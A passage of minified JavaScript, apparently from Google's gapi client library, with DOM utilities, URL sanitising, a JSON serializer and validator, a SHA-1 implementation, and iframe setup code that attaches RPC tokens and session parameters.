        var c = ((a.ownerDocument && a.ownerDocument.defaultView) || p)
          .document;
        (c.querySelector &&
          (c = c.querySelector("script[nonce]")) &&
          (c = c.nonce || c.getAttribute("nonce")) &&
          Lc.test(c)) ||
          (c = ""),
          c && a.setAttribute("nonce", c),
          (a.src = ob(b));
      },
      Nc = function (a, b, c, d) {
        return (
          (a = a instanceof rb ? a : vb(a)),
          (b = b || p),
          c instanceof lb
            ? c instanceof lb && c.constructor === lb && c.fk === kb
              ? (c = c.Qj)
              : (Ia("expected object of type Const, got '" + c + "'"),
                (c = "type_error:Const"))
            : (c = c || ""),
          void 0 !== d ? b.open(sb(a), c, d) : b.open(sb(a), c)
        );
      },
      Lc = /^[\w+/_-]+[=]{0,2}$/,
      Oc = function (a, b) {
        for (
          var c = a.split("%s"),
            d = "",
            e = Array.prototype.slice.call(arguments, 1);
          e.length && 1 < c.length;

        )
          d += c.shift() + e.shift();
        return d + c.join("%s");
      },
      Pc = function (a) {
        var b = document;
        return "string" == typeof a ? b.getElementById(a) : a;
      },
      Rc = function (a, b) {
        Wa(b, function (c, d) {
          "style" == d
            ? (a.style.cssText = c)
            : "class" == d
            ? (a.className = c)
            : "for" == d
            ? (a.htmlFor = c)
            : Qc.hasOwnProperty(d)
            ? a.setAttribute(Qc[d], c)
            : 0 == d.lastIndexOf("aria-", 0) || 0 == d.lastIndexOf("data-", 0)
            ? a.setAttribute(d, c)
            : (a[d] = c);
        });
      },
      Qc = {
        cellpadding: "cellPadding",
        cellspacing: "cellSpacing",
        colspan: "colSpan",
        frameborder: "frameBorder",
        height: "height",
        maxlength: "maxLength",
        nonce: "nonce",
        role: "role",
        rowspan: "rowSpan",
        type: "type",
        usemap: "useMap",
        valign: "vAlign",
        width: "width",
      },
      Tc = function (a, b, c) {
        return Sc(document, arguments);
      },
      Sc = function (a, b) {
        var c = b[1],
          d = Uc(a, String(b[0]));
        return (
          c &&
            ("string" == typeof c
              ? (d.className = c)
              : Array.isArray(c)
              ? (d.className = c.join(" "))
              : Rc(d, c)),
          2 < b.length && Vc(a, d, b, 2),
          d
        );
      },
      Vc = function (a, b, c, d) {
        function e(h) {
          h && b.appendChild("string" == typeof h ? a.createTextNode(h) : h);
        }
        for (; d < c.length; d++) {
          var f = c[d];
          if (!wa(f) || (t(f) && 0 < f.nodeType)) e(f);
          else {
            a: {
              if (f && "number" == typeof f.length) {
                if (t(f)) {
                  var g =
                    "function" == typeof f.item || "string" == typeof f.item;
                  break a;
                }
                if ("function" == typeof f) {
                  g = "function" == typeof f.item;
                  break a;
                }
              }
              g = !1;
            }
            x(g ? Ua(f) : f, e);
          }
        }
      },
      Uc = function (a, b) {
        return (
          (b = String(b)),
          "application/xhtml+xml" === a.contentType && (b = b.toLowerCase()),
          a.createElement(b)
        );
      },
      Wc = function (a) {
        for (var b; (b = a.firstChild); ) a.removeChild(b);
      },
      Xc = function (a) {
        return a && a.parentNode ? a.parentNode.removeChild(a) : null;
      },
      Yc = function (a) {
        return (
          w(a, "Node cannot be null or undefined."),
          9 == a.nodeType ? a : a.ownerDocument || a.document
        );
      },
      Zc = function (a) {
        this.Wd = a || p.document || document;
      };
    (k = Zc.prototype),
      (k.getElementsByTagName = function (a, b) {
        return (b || this.Wd).getElementsByTagName(String(a));
      }),
      (k.wk = function (a, b, c) {
        return Sc(this.Wd, arguments);
      }),
      (k.createElement = function (a) {
        return Uc(this.Wd, a);
      }),
      (k.createTextNode = function (a) {
        return this.Wd.createTextNode(String(a));
      }),
      (k.getWindow = function () {
        var a = this.Wd;
        return a.parentWindow || a.defaultView;
      }),
      (k.appendChild = function (a, b) {
        w(
          null != a && null != b,
          "goog.dom.appendChild expects non-null arguments"
        ),
          a.appendChild(b);
      }),
      (k.append = function (a, b) {
        Vc(Yc(a), a, arguments, 1);
      }),
      (k.canHaveChildren = function (a) {
        if (1 != a.nodeType) return !1;
        switch (a.tagName) {
          case "APPLET":
          case "AREA":
          case "BASE":
          case "BR":
          case "COL":
          case "COMMAND":
          case "EMBED":
          case "FRAME":
          case "HR":
          case "IMG":
          case "INPUT":
          case "IFRAME":
          case "ISINDEX":
          case "KEYGEN":
          case "LINK":
          case "NOFRAMES":
          case "NOSCRIPT":
          case "META":
          case "OBJECT":
          case "PARAM":
          case "SCRIPT":
          case "SOURCE":
          case "STYLE":
          case "TRACK":
          case "WBR":
            return !1;
        }
        return !0;
      }),
      (k.removeNode = Xc),
      (k.isElement = function (a) {
        return t(a) && 1 == a.nodeType;
      }),
      (k.contains = function (a, b) {
        if (!a || !b) return !1;
        if (a.contains && 1 == b.nodeType) return a == b || a.contains(b);
        if (void 0 !== a.compareDocumentPosition)
          return a == b || !!(16 & a.compareDocumentPosition(b));
        for (; b && a != b; ) b = b.parentNode;
        return b == a;
      });
    var C = window,
      $c = document,
      ad = /\[native code\]/,
      bd = function (a, b, c) {
        return (a[b] = a[b] || c);
      },
      cd = function (a) {
        return !!a && "object" == typeof a && ad.test(a.push);
      },
      dd = function (a) {
        for (var b = 0; b < this.length; b++) if (this[b] === a) return b;
        return -1;
      },
      fd = function (a, b, c) {
        if (a)
          if (cd(a)) {
            if (a) {
              D(cd(a), "arrayForEach was called with a non array value");
              for (var d = 0; d < a.length; d++) b.call(c, a[d], d);
            }
          } else
            for (d in (D(
              "object" == typeof a,
              "objectForEach was called with a non object value"
            ),
            (c = c || a),
            a))
              ed(a, d) && void 0 !== a[d] && b.call(c, a[d], d);
      },
      gd = /&/g,
      hd = /</g,
      id = />/g,
      jd = /"/g,
      kd = /'/g,
      ld = function (a) {
        return String(a)
          .replace(gd, "&amp;")
          .replace(hd, "&lt;")
          .replace(id, "&gt;")
          .replace(jd, "&quot;")
          .replace(kd, "&#39;");
      },
      md = function () {
        var a;
        if ((a = Object.create) && ad.test(a)) a = a(null);
        else for (var b in (a = {})) a[b] = void 0;
        return a;
      },
      ed = function (a, b) {
        return Object.prototype.hasOwnProperty.call(a, b);
      },
      nd = function (a, b) {
        for (var c in (a = a || {})) ed(a, c) && (b[c] = a[c]);
      },
      D = function (a, b) {
        if (!a) throw Error(b || "");
      },
      od = bd(C, "gapi", {}),
      pd =
        Object.freeze ||
        function (a) {
          return a;
        },
      qd = function (a, b) {
        (this.name = a), (this.value = b);
      };
    qd.prototype.toString = function () {
      return this.name;
    };
    var rd = new qd("OFF", 1 / 0),
      sd = new qd("SEVERE", 1e3),
      td = new qd("WARNING", 900),
      ud = new qd("CONFIG", 700),
      vd = new qd("FINE", 500),
      wd = function () {
        (this.Pe = 0), this.clear();
      },
      xd;
    wd.prototype.clear = function () {
      (this.Uh = Array(this.Pe)), (this.di = -1), (this.Oi = !1);
    };
    var yd = function (a, b) {
      this.reset(a || rd, b, null, void 0, void 0);
    };
    yd.prototype.reset = function () {};
    var zd = function (a) {
        (this.level = null),
          (this.fl = []),
          (this.parent = (void 0 === a ? null : a) || null),
          (this.children = []);
      },
      Ad = function (a) {
        return a.level
          ? a.level
          : a.parent
          ? Ad(a.parent)
          : (Ia("Root logger has no level set."), rd);
      },
      Bd = function (a, b) {
        for (; a; )
          a.fl.forEach(function (c) {
            c(b);
          }),
            (a = a.parent);
      },
      Cd = function () {
        this.entries = {};
        var a = new zd();
        (a.level = ud), (this.entries[""] = a);
      },
      Dd,
      Ed = function (a, b) {
        var c = a.entries[b];
        if (c) return c;
        c = Ed(a, b.slice(0, Math.max(b.lastIndexOf("."), 0)));
        var d = new zd(c);
        return (a.entries[b] = d), c.children.push(d), d;
      },
      Fd = function () {
        return Dd || (Dd = new Cd()), Dd;
      },
      Gd = function (a, b, c) {
        if (a && a && b && b.value >= (a ? Ad(Ed(Fd(), null)) : rd).value) {
          (b = b || rd),
            (a = Ed(Fd(), null)),
            "function" == typeof c && (c = c()),
            xd || (xd = new wd());
          var d = xd;
          if (0 < d.Pe) {
            var e = (d.di + 1) % d.Pe;
            (d.di = e),
              d.Oi
                ? (d = d.Uh[e]).reset(b, c, null)
                : ((d.Oi = e == d.Pe - 1), (d = d.Uh[e] = new yd(b, c)));
          } else d = new yd(b, c);
          Bd(a, d);
        }
      },
      Hd = function (a, b) {
        a && Gd(a, sd, b);
      },
      Id = function (a, b) {
        a && Gd(a, vd, b);
      };
    function Jd(a, b, c, d) {
      return void 0 !== (b = kc(b)) ? a.open(b, c, d) : null;
    }
    var Kd = function (a, b, c) {
        var d = new RegExp("([#].*&|[#])" + b + "=([^&#]*)", "g");
        if (
          ((b = new RegExp("([?#].*&|[?#])" + b + "=([^&#]*)", "g")),
          (a = a && (d.exec(a) || b.exec(a))))
        )
          try {
            c = decodeURIComponent(a[2]);
          } catch (e) {}
        return c;
      },
      Ld = new RegExp(
        /^/.source +
          /([a-zA-Z][-+.a-zA-Z0-9]*:)?/.source +
          /(\/\/[^\/?#]*)?/.source +
          /([^?#]*)?/.source +
          /(\?([^#]*))?/.source +
          /(#((#|[^#])*))?/.source +
          /$/.source
      ),
      Md = /[\ud800-\udbff][\udc00-\udfff]|[^!-~]/g,
      Nd = new RegExp(
        /(%([^0-9a-fA-F%]|[0-9a-fA-F]([^0-9a-fA-F%])?)?)*/.source +
          /%($|[^0-9a-fA-F]|[0-9a-fA-F]($|[^0-9a-fA-F]))/.source,
        "g"
      ),
      Od = /%([a-f]|[0-9a-fA-F][a-f])/g,
      Pd = /^(https?|ftp|file|chrome-extension):$/i,
      Qd = function (a) {
        a =
          (a = (a = String(a))
            .replace(Md, function (e) {
              try {
                return encodeURIComponent(e);
              } catch (f) {
                return encodeURIComponent(e.replace(/^[^%]+$/g, "�"));
              }
            })
            .replace(Nd, function (e) {
              return e.replace(/%/g, "%25");
            })
            .replace(Od, function (e) {
              return e.toUpperCase();
            })).match(Ld) || [];
        var b = md(),
          c = function (e) {
            return e
              .replace(/\\/g, "%5C")
              .replace(/\^/g, "%5E")
              .replace(/`/g, "%60")
              .replace(/\{/g, "%7B")
              .replace(/\|/g, "%7C")
              .replace(/\}/g, "%7D");
          },
          d = !!(a[1] || "").match(Pd);
        return (
          (b.Qd = c(
            (a[1] || "") + (a[2] || "") + (a[3] || (a[2] && d ? "/" : ""))
          )),
          (d = function (e) {
            return c(e.replace(/\?/g, "%3F").replace(/#/g, "%23"));
          }),
          (b.query = a[5] ? [d(a[5])] : []),
          (b.Rb = a[7] ? [d(a[7])] : []),
          b
        );
      },
      Rd = function (a) {
        return (
          a.Qd +
          (0 < a.query.length ? "?" + a.query.join("&") : "") +
          (0 < a.Rb.length ? "#" + a.Rb.join("&") : "")
        );
      },
      Sd = function (a, b) {
        var c = [];
        if (a)
          for (var d in a)
            if (ed(a, d) && null != a[d]) {
              var e = b ? b(a[d]) : a[d];
              c.push(encodeURIComponent(d) + "=" + encodeURIComponent(e));
            }
        return c;
      },
      Td = new RegExp(
        /\/?\??#?/.source +
          "(" +
          /[\/?#]/i.source +
          "|" +
          /[\uD800-\uDBFF]/i.source +
          "|" +
          /%[c-f][0-9a-f](%[89ab][0-9a-f]){0,2}(%[89ab]?)?/i.source +
          "|" +
          /%[0-9a-f]?/i.source +
          ")$",
        "i"
      ),
      Ud = function (a, b) {
        var c = Qd(b);
        (b = c.Qd),
          c.query.length && (b += "?" + c.query.join("")),
          c.Rb.length && (b += "#" + c.Rb.join(""));
        var d = "";
        2e3 < b.length &&
          ((d = b),
          (b = (b = b.substr(0, 2e3)).replace(Td, "")),
          (d = d.substr(b.length)));
        var e = a.createElement("div");
        if (
          ((a = a.createElement("a")),
          (b = (c = Qd(b)).Qd),
          c.query.length && (b += "?" + c.query.join("")),
          c.Rb.length && (b += "#" + c.Rb.join("")),
          "string" !=
            typeof (b = null === b ? "null" : void 0 === b ? "undefined" : b))
        )
          throw Error("Expected a string");
        if (
          (void 0 !== (b = kc((b = new rb(b, qb)))) && (a.href = b),
          e.appendChild(a),
          (a = e.innerHTML),
          Kc("Assignment to self."),
          (a = Sb(a)),
          1 === e.nodeType && ("SCRIPT" === (b = e.tagName) || "STYLE" === b))
        )
          throw Error(
            "SCRIPT" === b
              ? "Use safeScriptEl.setTextContent with a SafeScript."
              : "Use safeStyleEl.setTextContent with a SafeStyleSheet."
          );
        return (
          (e.innerHTML = Rb(a)),
          (b = String(e.firstChild.href)),
          e.parentNode && e.parentNode.removeChild(e),
          (d = (c = Qd(b + d)).Qd),
          c.query.length && (d += "?" + c.query.join("")),
          c.Rb.length && (d += "#" + c.Rb.join("")),
          d
        );
      },
      Vd = /^https?:\/\/[^\/%\\?#\s]+\/[^\s]*$/i,
      Wd,
      Yd = function (a, b, c) {
        Xd(a, b, c, "add", "at");
      },
      Xd = function (a, b, c, d, e) {
        a[d + "EventListener"]
          ? a[d + "EventListener"](b, c, !1)
          : a[e + "tachEvent"] && a[e + "tachEvent"]("on" + b, c);
      },
      Zd = function (a) {
        for (; a.firstChild; ) a.removeChild(a.firstChild);
      },
      $d =
        /^https?:\/\/(?:\w|[\-\.])+\.google\.(?:\w|[\-:\.])+(?:\/[^\?#]*)?\/u\/(\d)\//,
      ae =
        /^https?:\/\/(?:\w|[\-\.])+\.google\.(?:\w|[\-:\.])+(?:\/[^\?#]*)?\/b\/(\d{10,21})\//,
      be = function () {
        var a = Ca("googleapis.config/sessionIndex");
        if (
          ("string" == typeof a && 254 < a.length && (a = null),
          null == a && (a = window.__X_GOOG_AUTHUSER),
          "string" == typeof a && 254 < a.length && (a = null),
          null == a)
        ) {
          var b = window.google;
          b && (a = b.authuser);
        }
        return (
          "string" == typeof a && 254 < a.length && (a = null),
          null == a &&
            ((b = window.location.href),
            null == (a = Kd(b, "authuser") || null) &&
              (a = (a = b.match($d)) ? a[1] : null)),
          null == a ? null : (254 < (a = String(a)).length && (a = null), a)
        );
      },
      ce = function () {
        var a = Ca("googleapis.config/sessionDelegate");
        return (
          "string" == typeof a && 21 < a.length && (a = null),
          null == a && (a = (a = window.location.href.match(ae)) ? a[1] : null),
          null == a ? null : (21 < (a = String(a)).length && (a = null), a)
        );
      },
      de = {};
    (de = bd(C, "___jsl", md())), bd(de, "I", 0), bd(de, "hel", 10);
    var ee,
      fe,
      ge = void 0,
      he = function (a) {
        try {
          return p.JSON.parse.call(p.JSON, a);
        } catch (b) {
          return !1;
        }
      },
      ie = function (a) {
        return Object.prototype.toString.call(a);
      },
      je = ie(0),
      ke = ie(new Date(0)),
      le = ie(!0),
      me = ie(""),
      ne = ie({}),
      oe = ie([]),
      pe = function (a, b) {
        if (b)
          for (var c = 0, d = b.length; c < d; ++c)
            if (a === b[c])
              throw new TypeError("Converting circular structure to JSON");
        if ("undefined" !== (d = typeof a)) {
          ((c = Array.prototype.slice.call(b || [], 0))[c.length] = a),
            (b = []);
          var e = ie(a);
          if (
            null != a &&
            "function" == typeof a.toJSON &&
            (Object.prototype.hasOwnProperty.call(a, "toJSON") ||
              ((e !== oe ||
                (a.constructor !== Array && a.constructor !== Object)) &&
                (e !== ne ||
                  (a.constructor !== Array && a.constructor !== Object)) &&
                e !== me &&
                e !== je &&
                e !== le &&
                e !== ke))
          )
            return pe(a.toJSON.call(a), c);
          if (null == a) b[b.length] = "null";
          else if (e === je)
            (a = Number(a)),
              isNaN(a) || isNaN(a - a)
                ? (a = "null")
                : -0 === a && 0 > 1 / a && (a = "-0"),
              (b[b.length] = String(a));
          else if (e === le) b[b.length] = String(!!Number(a));
          else {
            if (e === ke) return pe(a.toISOString.call(a), c);
            if (e === oe && ie(a.length) === je) {
              b[b.length] = "[";
              var f = 0;
              for (d = Number(a.length) >> 0; f < d; ++f)
                f && (b[b.length] = ","), (b[b.length] = pe(a[f], c) || "null");
              b[b.length] = "]";
            } else if (e == me && ie(a.length) === je) {
              for (
                b[b.length] = '"', f = 0, c = Number(a.length) >> 0;
                f < c;
                ++f
              )
                (d = String.prototype.charAt.call(a, f)),
                  (e = String.prototype.charCodeAt.call(a, f)),
                  (b[b.length] =
                    "\b" === d
                      ? "\\b"
                      : "\f" === d
                      ? "\\f"
                      : "\n" === d
                      ? "\\n"
                      : "\r" === d
                      ? "\\r"
                      : "\t" === d
                      ? "\\t"
                      : "\\" === d || '"' === d
                      ? "\\" + d
                      : 31 >= e
                      ? "\\u" + (e + 65536).toString(16).substr(1)
                      : 32 <= e && 65535 >= e
                      ? d
                      : "�");
              b[b.length] = '"';
            } else {
              if ("object" !== d) return;
              for (f in ((b[b.length] = "{"), (d = 0), a))
                Object.prototype.hasOwnProperty.call(a, f) &&
                  void 0 !== (e = pe(a[f], c)) &&
                  (d++ && (b[b.length] = ","),
                  (b[b.length] = pe(f)),
                  (b[b.length] = ":"),
                  (b[b.length] = e));
              b[b.length] = "}";
            }
          }
          return b.join("");
        }
      },
      qe = /[\0-\x07\x0b\x0e-\x1f]/,
      se = /^([^"]*"([^\\"]|\\.)*")*[^"]*"([^"\\]|\\.)*[\0-\x1f]/,
      te = /^([^"]*"([^\\"]|\\.)*")*[^"]*"([^"\\]|\\.)*\\[^\\\/"bfnrtu]/,
      ue =
        /^([^"]*"([^\\"]|\\.)*")*[^"]*"([^"\\]|\\.)*\\u([0-9a-fA-F]{0,3}[^0-9a-fA-F])/,
      ve = /"([^\0-\x1f\\"]|\\[\\\/"bfnrt]|\\u[0-9a-fA-F]{4})*"/g,
      we = /-?(0|[1-9][0-9]*)(\.[0-9]+)?([eE][-+]?[0-9]+)?/g,
      xe = /[ \t\n\r]+/g,
      ye = /[^"]:/,
      ze = /""/g,
      Ae = /true|false|null/g,
      Be = /00/,
      Ce = /[\{]([^0\}]|0[^:])/,
      De = /(^|\[)[,:]|[,:](\]|\}|[,:]|$)/,
      Ee = /[^\[,:][\[\{]/,
      Fe = /^(\{|\}|\[|\]|,|:|0)+/,
      Ge = /\u2028/g,
      He = /\u2029/g,
      Ie = function (a) {
        if (
          ((a = String(a)),
          qe.test(a) || se.test(a) || te.test(a) || ue.test(a))
        )
          return !1;
        var b = a.replace(ve, '""');
        if (((b = b.replace(we, "0")), (b = b.replace(xe, "")), ye.test(b)))
          return !1;
        if (
          ((b = b.replace(ze, "0")),
          (b = b.replace(Ae, "0")),
          Be.test(b) ||
            Ce.test(b) ||
            De.test(b) ||
            Ee.test(b) ||
            !b ||
            (b = b.replace(Fe, "")))
        )
          return !1;
        (a = a.replace(Ge, "\\u2028").replace(He, "\\u2029")), (b = void 0);
        try {
          b = ge
            ? [he(a)]
            : eval(
                "(function (var_args) {\n  return Array.prototype.slice.call(arguments, 0);\n})(\n" +
                  a +
                  "\n)"
              );
        } catch (c) {
          return !1;
        }
        return !(!b || 1 !== b.length) && b[0];
      },
      Je = function () {
        var a = ((p.document || {}).scripts || []).length;
        if ((void 0 === ee || void 0 === ge || fe !== a) && -1 !== fe) {
          (ee = ge = !1), (fe = -1);
          try {
            try {
              ge =
                !!p.JSON &&
                '{"a":[3,true,"1970-01-01T00:00:00.000Z"]}' ===
                  p.JSON.stringify.call(p.JSON, {
                    a: [3, !0, new Date(0)],
                    c: function () {},
                  }) &&
                !0 === he("true") &&
                3 === he('[{"a":3}]')[0].a;
            } catch (b) {}
            ee = ge && !he("[00]") && !he('""') && !he('"\\0"') && !he('"\\v"');
          } finally {
            fe = a;
          }
        }
      },
      Ke = function (a) {
        return -1 !== fe && (Je(), (ee ? he : Ie)(a));
      },
      Le = function (a) {
        if (-1 !== fe)
          return Je(), ge ? p.JSON.stringify.call(p.JSON, a) : pe(a);
      },
      Me =
        !Date.prototype.toISOString ||
        "function" != typeof Date.prototype.toISOString ||
        "1970-01-01T00:00:00.000Z" !== new Date(0).toISOString(),
      Ne = function () {
        var a = Date.prototype.getUTCFullYear.call(this);
        return [
          0 > a
            ? "-" + String(1e6 - a).substr(1)
            : 9999 >= a
            ? String(1e4 + a).substr(1)
            : "+" + String(1e6 + a).substr(1),
          "-",
          String(101 + Date.prototype.getUTCMonth.call(this)).substr(1),
          "-",
          String(100 + Date.prototype.getUTCDate.call(this)).substr(1),
          "T",
          String(100 + Date.prototype.getUTCHours.call(this)).substr(1),
          ":",
          String(100 + Date.prototype.getUTCMinutes.call(this)).substr(1),
          ":",
          String(100 + Date.prototype.getUTCSeconds.call(this)).substr(1),
          ".",
          String(1e3 + Date.prototype.getUTCMilliseconds.call(this)).substr(1),
          "Z",
        ].join("");
      };
    Date.prototype.toISOString = Me ? Ne : Date.prototype.toISOString;
    var Oe = function () {
        this.blockSize = -1;
      },
      Pe = function () {
        (this.blockSize = -1),
          (this.blockSize = 64),
          (this.va = []),
          (this.mg = []),
          (this.hk = []),
          (this.Af = []),
          (this.Af[0] = 128);
        for (var a = 1; a < this.blockSize; ++a) this.Af[a] = 0;
        (this.bc = this.rd = 0), this.reset();
      };
    v(Pe, Oe),
      (Pe.prototype.reset = function () {
        (this.va[0] = 1732584193),
          (this.va[1] = 4023233417),
          (this.va[2] = 2562383102),
          (this.va[3] = 271733878),
          (this.va[4] = 3285377520),
          (this.bc = this.rd = 0);
      });
    var Qe = function (a, b, c) {
      c || (c = 0);
      var d = a.hk;
      if ("string" == typeof b)
        for (var e = 0; 16 > e; e++)
          (d[e] =
            (b.charCodeAt(c) << 24) |
            (b.charCodeAt(c + 1) << 16) |
            (b.charCodeAt(c + 2) << 8) |
            b.charCodeAt(c + 3)),
            (c += 4);
      else
        for (e = 0; 16 > e; e++)
          (d[e] = (b[c] << 24) | (b[c + 1] << 16) | (b[c + 2] << 8) | b[c + 3]),
            (c += 4);
      for (e = 16; 80 > e; e++) {
        var f = d[e - 3] ^ d[e - 8] ^ d[e - 14] ^ d[e - 16];
        d[e] = 4294967295 & ((f << 1) | (f >>> 31));
      }
      (b = a.va[0]), (c = a.va[1]);
      var g = a.va[2],
        h = a.va[3],
        l = a.va[4];
      for (e = 0; 80 > e; e++) {
        if (40 > e)
          if (20 > e) {
            f = h ^ (c & (g ^ h));
            var m = 1518500249;
          } else (f = c ^ g ^ h), (m = 1859775393);
        else
          60 > e
            ? ((f = (c & g) | (h & (c | g))), (m = 2400959708))
            : ((f = c ^ g ^ h), (m = 3395469782));
        (f = (((b << 5) | (b >>> 27)) + f + l + m + d[e]) & 4294967295),
          (l = h),
          (h = g),
          (g = 4294967295 & ((c << 30) | (c >>> 2))),
          (c = b),
          (b = f);
      }
      (a.va[0] = (a.va[0] + b) & 4294967295),
        (a.va[1] = (a.va[1] + c) & 4294967295),
        (a.va[2] = (a.va[2] + g) & 4294967295),
        (a.va[3] = (a.va[3] + h) & 4294967295),
        (a.va[4] = (a.va[4] + l) & 4294967295);
    };
    (Pe.prototype.update = function (a, b) {
      if (null != a) {
        void 0 === b && (b = a.length);
        for (
          var c = b - this.blockSize, d = 0, e = this.mg, f = this.rd;
          d < b;

        ) {
          if (0 == f) for (; d <= c; ) Qe(this, a, d), (d += this.blockSize);
          if ("string" == typeof a) {
            for (; d < b; )
              if (((e[f] = a.charCodeAt(d)), ++d, ++f == this.blockSize)) {
                Qe(this, e), (f = 0);
                break;
              }
          } else
            for (; d < b; )
              if (((e[f] = a[d]), ++d, ++f == this.blockSize)) {
                Qe(this, e), (f = 0);
                break;
              }
        }
        (this.rd = f), (this.bc += b);
      }
    }),
      (Pe.prototype.digest = function () {
        var a = [],
          b = 8 * this.bc;
        56 > this.rd
          ? this.update(this.Af, 56 - this.rd)
          : this.update(this.Af, this.blockSize - (this.rd - 56));
        for (var c = this.blockSize - 1; 56 <= c; c--)
          (this.mg[c] = 255 & b), (b /= 256);
        for (Qe(this, this.mg), c = b = 0; 5 > c; c++)
          for (var d = 24; 0 <= d; d -= 8)
            (a[b] = (this.va[c] >> d) & 255), ++b;
        return a;
      });
    var Re = function () {
      this.Eh = new Pe();
    };
    (k = Re.prototype),
      (k.reset = function () {
        this.Eh.reset();
      }),
      (k.updateByteArray = function (a) {
        this.Eh.update(a);
      }),
      (k.digestByteArray = function () {
        return this.Eh.digest();
      }),
      (k.updateString = function (a) {
        for (
          var b = [], c = 0, d = (a = unescape(encodeURIComponent(a))).length;
          c < d;
          ++c
        )
          b.push(a.charCodeAt(c));
        this.updateByteArray(b);
      }),
      (k.digestString = function () {
        for (var a = this.digestByteArray(), b = "", c = 0; c < a.length; c++)
          b +=
            "0123456789ABCDEF".charAt(Math.floor(a[c] / 16)) +
            "0123456789ABCDEF".charAt(a[c] % 16);
        return b;
      });
    var Se = C.crypto,
      Te = !1,
      Ue = 0,
      Ve = 0,
      We = 1,
      Xe = 0,
      Ye = "",
      Ze = function (a) {
        var b = ((a = a || C.event).screenX + a.clientX) << 16;
        (b += a.screenY + a.clientY),
          (b *= new Date().getTime() % 1e6),
          (We = (We * b) % Xe),
          0 < Ue && ++Ve == Ue && Xd(C, "mousemove", Ze, "remove", "de");
      },
      $e = function (a) {
        var b = new Re();
        return b.updateString(a), b.digestString();
      };
    (Te = !!Se && "function" == typeof Se.getRandomValues),
      Te ||
        ((Xe = 1e6 * (screen.width * screen.width + screen.height)),
        (Ye = $e(
          $c.cookie +
            "|" +
            $c.location +
            "|" +
            new Date().getTime() +
            "|" +
            Math.random()
        )),
        (Ue = Ca("random/maxObserveMousemove") || 0),
        0 != Ue && Yd(C, "mousemove", Ze));
    var af = function () {
        var a = de.onl;
        if (!a) {
          (a = md()), (de.onl = a);
          var b = md();
          (a.e = function (c) {
            var d = b[c];
            d && (delete b[c], d());
          }),
            (a.a = function (c, d) {
              b[c] = d;
            }),
            (a.r = function (c) {
              delete b[c];
            });
        }
        return a;
      },
      bf = function (a, b) {
        return "function" == typeof (b = b.onload) ? (af().a(a, b), b) : null;
      },
      cf = function (a) {
        return (
          D(/^\w+$/.test(a), "Unsupported id - " + a),
          'onload="window.___jsl.onl.e(&#34;' + a + '&#34;)"'
        );
      },
      df = function (a) {
        af().r(a);
      },
      ef = {
        allowtransparency: "true",
        frameborder: "0",
        hspace: "0",
        marginheight: "0",
        marginwidth: "0",
        scrolling: "no",
        style: "",
        tabindex: "0",
        vspace: "0",
        width: "100%",
      },
      ff = { allowtransparency: !0, onload: !0 },
      gf = 0,
      hf = function (a, b) {
        var c = 0;
        do {
          var d = b.id || ["I", gf++, "_", new Date().getTime()].join("");
        } while (a.getElementById(d) && 5 > ++c);
        return D(5 > c, "Error creating iframe id"), d;
      },
      jf = function (a, b) {
        return a ? b + "/" + a : "";
      },
      kf = function (a, b, c, d) {
        var e = {},
          f = {};
        a.documentMode && 9 > a.documentMode && (e.hostiemode = a.documentMode),
          nd(d.queryParams || {}, e),
          nd(d.fragmentParams || {}, f);
        var g = d.pfname,
          h = md();
        if (
          (Ca("iframes/dropLegacyIdParam") || (h.id = c),
          (h._gfid = c),
          (h.parent = a.location.protocol + "//" + a.location.host),
          (c = Kd(a.location.href, "parent")),
          !(g = g || "") &&
            c &&
            ((g =
              Kd(a.location.href, "_gfid", "") ||
              Kd(a.location.href, "id", "")),
            (g = jf(g, Kd(a.location.href, "pfname", "")))),
          g ||
            ((c = Ke(Kd(a.location.href, "jcp", ""))) &&
              "object" == typeof c &&
              (g = jf(c.id, c.pfname))),
          (h.pfname = g),
          d.connectWithJsonParam && (((g = {}).jcp = Le(h)), (h = g)),
          !(g = Kd(b, "rpctoken") || e.rpctoken || f.rpctoken))
        ) {
          if (!(g = d.rpctoken)) {
            g = String;
            var l = (c = Math).round;
            if (Te) {
              var m = new C.Uint32Array(1);
              Se.getRandomValues(m), (m = Number("0." + m[0]));
            } else
              (m = We),
                (m += parseInt(Ye.substr(0, 20), 16)),
                (Ye = $e(Ye)),
                (m /= Xe + Math.pow(16, 20));
            g = g(l.call(c, 1e8 * m));
          }
          h.rpctoken = g;
        }
        return (
          (d.rpctoken = g),
          nd(h, d.connectWithQueryParams ? e : f),
          (h = a.location.href),
          (a = md()),
          (g = Kd(h, "_bsh", de.bsh)) && (a._bsh = g),
          (h = de.dpo ? de.h : Kd(h, "jsh", de.h)) && (a.jsh = h),
          d.hintInFragment ? nd(a, f) : nd(a, e),
          (d = d.paramsSerializer),
          (b = Qd(b)).query.push.apply(b.query, Sd(e, d)),
          b.Rb.push.apply(b.Rb, Sd(f, d)),
          Rd(b)
        );
      },
      lf = function (a) {
        D(!a || Vd.test(a), "Illegal url for new iframe - " + a);
      },
      mf = function (a, b, c, d, e) {
        lf(c.src);
        var f,
          g = bf(d, c),
          h = g ? cf(d) : "";
        try {
          document.all &&
            (f = a.createElement(
              '<iframe frameborder="' +
                ld(String(c.frameborder)) +
                '" scrolling="' +
                ld(String(c.scrolling)) +
                '" ' +
                h +
                ' name="' +
                ld(String(c.name)) +
                '"/>'
            ));
        } catch (m) {
        } finally {
          f ||
            ((f = (a ? new Zc(Yc(a)) : Ea || (Ea = new Zc())).wk("IFRAME")),
            g &&
              ((f.onload = function () {
                (f.onload = null), g.call(this);
              }),
              df(d)));
        }
        for (var l in (f.setAttribute("ng-non-bindable", ""), c))
          (a = c[l]),
            "style" === l && "object" == typeof a
              ? nd(a, f.style)
              : ff[l] || f.setAttribute(l, String(a));
        return (
          (l = (e && e.beforeNode) || null) || (e && e.dontclear) || Zd(b),
          b.insertBefore(f, l),
          (f = l ? l.previousSibling : b.lastChild),
          c.allowtransparency && (f.allowTransparency = !0),
          f
        );
      },
      nf = /^:[\w]+$/,
      of = /:([a-zA-Z_]+):/g,
      pf = function (a, b) {
        a = be() || "0";
        var c = ce(),
          d = be() || a,
          e = ce(),
          f = "";
        d && (f += "u/" + encodeURIComponent(String(d)) + "/"),
          e && (f += "b/" + encodeURIComponent(String(e)) + "/"),
          (d = f || null),
          (f = (e = !1 === Ca("isLoggedIn")) ? "_/im/" : "") && (d = "");
        var g = Ca("iframes/:socialhost:"),
          h = Ca("iframes/:im_socialhost:");
        return (
          (Wd = {
            socialhost: g,
            ctx_socialhost: e ? h : g,
            session_index: a,
            session_delegate: c,
            session_prefix: d,
            im_prefix: f,
          })[b] || ""
        );
      },
      qf = function (a) {
